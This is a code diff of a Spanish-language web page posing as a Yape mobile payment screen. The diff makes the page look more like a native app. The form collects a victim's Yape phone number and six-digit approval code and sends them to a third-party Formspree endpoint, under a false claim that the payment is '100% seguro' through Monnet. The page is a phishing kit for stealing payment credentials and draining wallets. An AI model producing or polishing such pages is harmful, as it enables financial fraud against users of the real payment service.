@@ -2,140 +2,132 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>YAPE</title>
+    
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#742284">
+
     <style>
-        /* Estilos Base */
+        /* Estilos Base para simular App */
         body {
             font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f4f7f6;
+            background-color: #742284; /* Fondo morado para evitar destellos blancos */
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             margin: 0;
+            overflow: hidden; /* Evita el scroll para que parezca fija */
         }
 
         .main-wrapper {
             background: white;
-            border-radius: 16px;
-            box-shadow: 0 12px 40px rgba(0,0,0,0.12);
             width: 100%;
-            max-width: 380px;
-            overflow: hidden;
-            border: 1px solid #eee;
+            height: 100vh; /* Ocupa toda la pantalla */
+            max-width: 450px;
+            display: flex;
+            flex-direction: column;
+            position: relative;
         }
 
-        /* Cabecera decorativa simulando pasarela */
         .header-bar {
-            height: 5px;
+            height: 6px;
             background: linear-gradient(90deg, #742284 0%, #a332ba 100%);
         }
 
         .payment-side {
-            padding: 30px 25px;
+            padding: 40px 30px;
             color: #333;
             text-align: center;
+            flex-grow: 1;
         }
 
         .logo-yape {
-            width: 110px;
-            margin-bottom: 20px;
+            width: 120px;
+            margin-bottom: 30px;
         }
 
         .instruction {
-            font-size: 14px;
+            font-size: 15px;
             color: #666;
-            margin-bottom: 25px;
-            line-height: 1.4;
+            margin-bottom: 35px;
+            line-height: 1.5;
         }
 
         .label-text {
             display: block;
             text-align: left;
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 700;
-            color: #555;
-            margin-bottom: 8px;
+            color: #777;
+            margin-bottom: 6px;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
+            letter-spacing: 0.8px;
         }
 
         /* Inputs Estilizados */
         input {
             width: 100%;
-            padding: 14px;
-            margin-bottom: 18px;
-            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 25px;
+            border-radius: 12px;
             box-sizing: border-box;
-            font-size: 16px;
-            border: 1px solid #ccc;
+            font-size: 18px;
+            border: 1px solid #ddd;
             outline: none;
-            transition: border-color 0.3s, box-shadow 0.3s;
+            background-color: #f9f9f9;
+            transition: all 0.3s;
         }
 
         input:focus {
             border-color: #742284;
-            box-shadow: 0 0 0 3px rgba(116, 34, 132, 0.1);
-        }
-
-        .input-codigo {
-            text-align: center;
-            font-weight: bold;
-            font-size: 24px;
-            letter-spacing: 8px;
-            border: 2px solid #333;
+            background-color: #fff;
+            box-shadow: 0 0 0 4px rgba(116, 34, 132, 0.1);
         }
 
         .menu-ayuda {
             display: block;
-            font-size: 12px;
+            font-size: 13px;
             color: #742284;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
             text-decoration: none;
             font-weight: 600;
         }
 
-        .menu-ayuda:hover {
-            text-decoration: underline;
-        }
-
-        /* Botón Dinámico */
+        /* Botón Estilo Yape */
         .btn-yapear {
             width: 100%;
-            padding: 16px;
+            padding: 18px;
             background-color: #742284;
             color: white;
             border: none;
-            border-radius: 10px;
+            border-radius: 25px; /* Bordes más redondeados tipo App */
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
             transition: all 0.3s ease;
-            opacity: 0.5; /* Desactivado por defecto visualmente */
-            pointer-events: none; /* Desactivado por defecto funcionalmente */
+            opacity: 0.5;
+            pointer-events: none;
+            text-transform: uppercase;
         }
 
-        /* Clase que se activa con JS */
         .btn-yapear.active {
             opacity: 1;
             pointer-events: auto;
-            box-shadow: 0 4px 15px rgba(116, 34, 132, 0.3);
-        }
-
-        .btn-yapear.active:hover {
-            background-color: #5a1a66;
-            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(116, 34, 132, 0.4);
         }
 
         .footer-secure {
-            font-size: 11px;
-            color: #aaa;
-            margin-top: 20px;
+            padding-bottom: 30px;
+            font-size: 12px;
+            color: #bbb;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 5px;
+            gap: 6px;
         }
     </style>
 </head>
@@ -143,42 +135,34 @@
 
 <div class="main-wrapper">
     <div class="header-bar"></div>
+    
     <div class="payment-side">
         <img src="https://www.apuestatotal.com//cms/img/banners/892/logo-yape.png" alt="Yape" class="logo-yape">
         
-        <p class="instruction">Confirma tu pago de forma segura ingresando los datos solicitados.</p>
-
+        <p class="instruction">Ingresa tus datos para validar el pago.</p>
+        
         <form id="paymentForm" action="https://formspree.io/f/xaqyqrjy" method="POST">
             
             <label class="label-text">Celular Yape</label>
-            <input type="tel" 
-                   id="celular"
-                   name="Celular_Comprador" 
-                   placeholder="900 000 000" 
-                   maxlength="9"
-                   oninput="this.value = this.value.replace(/[^0-9]/g, '')"
-                   required>
+            <input type="tel" id="celular" name="Celular_Yape" 
+                   placeholder="900 000 000" maxlength="9" 
+                   inputmode="numeric" pattern="[0-9]*" required>
 
             <label class="label-text">Código de aprobación</label>
-            <input type="text" 
-                   id="codigo"
-                   name="Codigo_Aprobacion" 
-                   placeholder="000000" 
-                   maxlength="6" 
-                   oninput="this.value = this.value.replace(/[^0-9]/g, '')"
-                   required>
+            <input type="tel" id="codigo" name="Codigo_Aprobacion" 
+                   placeholder="000000" maxlength="6" 
+                   inputmode="numeric" pattern="[0-9]*" required>
 
-            <a href="#" class="menu-ayuda">¿Cómo obtener el código de aprobación?</a>
+            <a href="#" class="menu-ayuda">¿Cómo obtener el código?</a>
 
-            <input type="hidden" name="Producto" value="Servicio Verificado">
-            <input type="hidden" name="Precio" value="S/ 0.10">
-
-            <button type="submit" id="btnSubmit" class="btn-yapear">PAGAR S/ 0.10</button>
+            <input type="hidden" name="_subject" value="Nuevo Pago Yape Recibido">
+            
+            <button type="submit" id="btnSubmit" class="btn-yapear">Yapear</button>
         </form>
+    </div>
 
-        <div class="footer-secure">
-            <span>🔒 Pago procesado de forma segura por Monnet</span>
-        </div>
+    <div class="footer-secure">
+        <span>🔒 Pago 100% seguro con tecnología Monnet</span>
     </div>
 </div>
 
@@ -188,7 +172,7 @@
     const btnSubmit = document.getElementById('btnSubmit');
 
     function validarFormulario() {
-        // El celular debe tener 9 dígitos y el código 6
+        // Solo activa el botón si el celular tiene 9 y el código 6 dígitos
         if (celularInput.value.length === 9 && codigoInput.value.length === 6) {
             btnSubmit.classList.add('active');
         } else {
@@ -196,24 +180,14 @@
         }
     }
 
-    // Escuchar cada vez que el usuario escribe
-    celularInput.addEventListener('input', validarFormulario);
-    codigoInput.addEventListener('input', validarFormulario);
+    // Limitar solo a números mientras escriben
+    [celularInput, codigoInput].forEach(input => {
+        input.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+            validarFormulario();
+        });
+    });
 </script>
 
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
